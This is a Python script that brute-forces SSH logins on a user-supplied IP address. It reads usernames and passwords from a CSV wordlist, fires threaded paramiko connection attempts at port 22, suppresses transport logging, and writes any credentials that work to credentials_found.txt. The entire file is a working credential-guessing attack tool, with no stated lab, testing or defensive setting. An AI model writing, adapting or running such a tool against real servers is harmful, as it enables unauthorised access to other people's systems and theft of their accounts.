import csv
import ipaddress
import threading
import time
import logging
from logging import NullHandler
from paramiko import SSHClient, AutoAddPolicy, AuthenticationException, ssh_exception

# This function is responsible for the SSH client connecting.
def ssh_connect(host, username, password):
    ssh_client = SSHClient()
    ssh_client.set_missing_host_key_policy(AutoAddPolicy())
    try:
        ssh_client.connect(host, port=22, username=username, password=password, banner_timeout=300)
        with open("credentials_found.txt", "a") as fh:
            print(f"Username - {username} and Password - {password} found.")
            fh.write(f"Username: {username}\nPassword: {password}\nWorked on host {host}\n")
    except AuthenticationException:
        print(f"Username - {username} and Password - {password} is Incorrect.")
    except ssh_exception.SSHException:
        print("**** Attempting to connect - Rate limiting on server ****")

# This function gets a valid IP address from the user.
def get_ip_address():
    while True:
        host = input("Please enter the host IP address: ")
        try:
            ipaddress.IPv4Address(host)
            return host
        except ipaddress.AddressValueError:
            print("Please enter a valid IP address.")

# This function allows the user to input a known username or use both username and password from the CSV file.
def main():
    logging.getLogger('paramiko.transport').addHandler(NullHandler())
    list_file = "passwords.csv"
    host = get_ip_address()
    use_known_username = input("Do you know the username? (yes/no): ").strip().lower()

    if use_known_username == "yes":
        username = input("Enter the known username: ").strip()
        print(f"Cracking passwords for username: {username}")
        with open(list_file) as fh:
            csv_reader = csv.reader(fh, delimiter=",")
            for index, row in enumerate(csv_reader):
                if index == 0:  # Skip the header
                    continue
                password = row[0]  # Assuming passwords are in the first column
                t = threading.Thread(target=ssh_connect, args=(host, username, password))
                t.start()
                time.sleep(0.2)
    else:
        print("Using usernames and passwords from the CSV file.")
        with open(list_file) as fh:
            csv_reader = csv.reader(fh, delimiter=",")
            for index, row in enumerate(csv_reader):
                if index == 0:  # Skip the header
                    continue
                username = row[0]
                password = row[1]
                t = threading.Thread(target=ssh_connect, args=(host, username, password))
                t.start()
                time.sleep(0.2)

# Entry point for the script
if __name__ == "__main__":
    main()
